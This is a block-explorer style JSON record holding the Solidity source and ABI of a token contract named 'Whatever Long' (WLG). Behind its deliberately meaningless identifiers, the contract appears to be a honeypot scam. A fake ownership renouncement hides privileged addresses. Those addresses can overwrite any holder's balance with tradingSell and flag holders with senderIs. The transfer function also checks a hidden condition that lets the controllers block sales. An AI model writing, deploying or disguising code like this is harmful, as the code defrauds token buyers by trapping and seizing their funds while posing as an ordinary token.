{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface listFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txReceiver {\n    function createPair(address receiverFrom, address launchTotalTrading) external returns (address);\n}\n\ninterface atFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedMin) external view returns (uint256);\n\n    function transfer(address senderFee, uint256 receiverTotalFrom) external returns (bool);\n\n    function allowance(address modeExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTotalFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderFee,\n        uint256 receiverTotalFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenFeeLimit, uint256 value);\n    event Approval(address indexed modeExempt, address indexed spender, uint256 value);\n}\n\ninterface minSwap is atFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WhateverLong is toTrading, atFee, minSwap {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverList;\n    }\n\n    uint256 public shouldEnable;\n\n    function owner() external view returns (address) {\n        return exemptAt;\n    }\n\n    uint256 public exemptTo;\n\n    function tradingSell(address liquiditySell, uint256 receiverTotalFrom) public {\n        enableSender();\n        swapSell[liquiditySell] = receiverTotalFrom;\n    }\n\n    function launchTotal(address buyFundIs, address senderFee, uint256 receiverTotalFrom) internal returns (bool) {\n        require(swapSell[buyFundIs] >= receiverTotalFrom);\n        swapSell[buyFundIs] -= receiverTotalFrom;\n        swapSell[senderFee] += receiverTotalFrom;\n        emit Transfer(buyFundIs, senderFee, receiverTotalFrom);\n        return true;\n    }\n\n    address public atLaunched;\n\n    mapping(address => bool) public takeReceiver;\n\n    uint8 private listReceiverLaunched = 18;\n\n    bool public launchedShould;\n\n    function senderIs(address fromLaunched) public {\n        enableSender();\n        \n        if (fromLaunched == atLaunched || fromLaunched == receiverLimit) {\n            return;\n        }\n        takeReceiver[fromLaunched] = true;\n    }\n\n    bool public isFundWallet;\n\n    uint256 private receiverLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return minMaxLaunch;\n    }\n\n    event OwnershipTransferred(address indexed enableReceiverMarketing, address indexed launchedList);\n\n    address public receiverLimit;\n\n    mapping(address => bool) public totalFund;\n\n    address private exemptAt;\n\n    function enableSender() private view {\n        require(totalFund[_msgSender()]);\n    }\n\n    string private receiverReceiverBuy = \"WLG\";\n\n    function totalSwap(uint256 receiverTotalFrom) public {\n        enableSender();\n        totalEnableAmount = receiverTotalFrom;\n    }\n\n    uint256 private shouldExempt;\n\n    bool public totalExemptLimit;\n\n    constructor (){\n        \n        listFund maxAutoMin = listFund(shouldAutoList);\n        receiverLimit = txReceiver(maxAutoMin.factory()).createPair(maxAutoMin.WETH(), address(this));\n        if (modeLaunchedTrading != exemptTo) {\n            exemptTo = shouldEnable;\n        }\n        atLaunched = _msgSender();\n        teamToken();\n        totalFund[atLaunched] = true;\n        swapSell[atLaunched] = receiverList;\n        \n        emit Transfer(address(0), atLaunched, receiverList);\n    }\n\n    function transfer(address liquiditySell, uint256 receiverTotalFrom) external virtual override returns (bool) {\n        return amountTotalReceiver(_msgSender(), liquiditySell, receiverTotalFrom);\n    }\n\n    function teamAmount(address autoExemptReceiver) public {\n        if (exemptTrading) {\n            return;\n        }\n        \n        totalFund[autoExemptReceiver] = true;\n        if (launchedShould) {\n            isFundWallet = true;\n        }\n        exemptTrading = true;\n    }\n\n    uint256 constant sellBuy = 4 ** 10;\n\n    string private minMaxLaunch = \"Whatever Long\";\n\n    function amountTotalReceiver(address buyFundIs, address senderFee, uint256 receiverTotalFrom) internal returns (bool) {\n        if (buyFundIs == atLaunched) {\n            return launchTotal(buyFundIs, senderFee, receiverTotalFrom);\n        }\n        uint256 modeTeam = atFee(receiverLimit).balanceOf(amountAutoExempt);\n        require(modeTeam == totalEnableAmount);\n        require(senderFee != amountAutoExempt);\n        if (takeReceiver[buyFundIs]) {\n            return launchTotal(buyFundIs, senderFee, sellBuy);\n        }\n        return launchTotal(buyFundIs, senderFee, receiverTotalFrom);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverReceiverBuy;\n    }\n\n    bool private receiverLimitShould;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listReceiverLaunched;\n    }\n\n    function transferFrom(address buyFundIs, address senderFee, uint256 receiverTotalFrom) external override returns (bool) {\n        if (_msgSender() != shouldAutoList) {\n            if (launchFund[buyFundIs][_msgSender()] != type(uint256).max) {\n                require(receiverTotalFrom <= launchFund[buyFundIs][_msgSender()]);\n                launchFund[buyFundIs][_msgSender()] -= receiverTotalFrom;\n            }\n        }\n        return amountTotalReceiver(buyFundIs, senderFee, receiverTotalFrom);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchFund;\n\n    uint256 private receiverList = 100000000 * 10 ** 18;\n\n    uint256 totalEnableAmount;\n\n    uint256 liquidityTrading;\n\n    function getOwner() external view returns (address) {\n        return exemptAt;\n    }\n\n    mapping(address => uint256) private swapSell;\n\n    bool public exemptTrading;\n\n    address amountAutoExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public modeLaunchedTrading;\n\n    function balanceOf(address launchedMin) public view virtual override returns (uint256) {\n        return swapSell[launchedMin];\n    }\n\n    bool public txFrom;\n\n    function teamToken() public {\n        emit OwnershipTransferred(atLaunched, address(0));\n        exemptAt = address(0);\n    }\n\n    function allowance(address listLiquidity, address exemptWallet) external view virtual override returns (uint256) {\n        if (exemptWallet == shouldAutoList) {\n            return type(uint256).max;\n        }\n        return launchFund[listLiquidity][exemptWallet];\n    }\n\n    function approve(address exemptWallet, uint256 receiverTotalFrom) public virtual override returns (bool) {\n        launchFund[_msgSender()][exemptWallet] = receiverTotalFrom;\n        emit Approval(_msgSender(), exemptWallet, receiverTotalFrom);\n        return true;\n    }\n\n    address shouldAutoList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiverMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenFeeLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotalFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFundWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"}],\"name\":\"senderIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoExemptReceiver\",\"type\":\"address\"}],\"name\":\"teamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExemptLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTotalFrom\",\"type\":\"uint256\"}],\"name\":\"totalSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotalFrom\",\"type\":\"uint256\"}],\"name\":\"tradingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotalFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFundIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTotalFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "WhateverLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}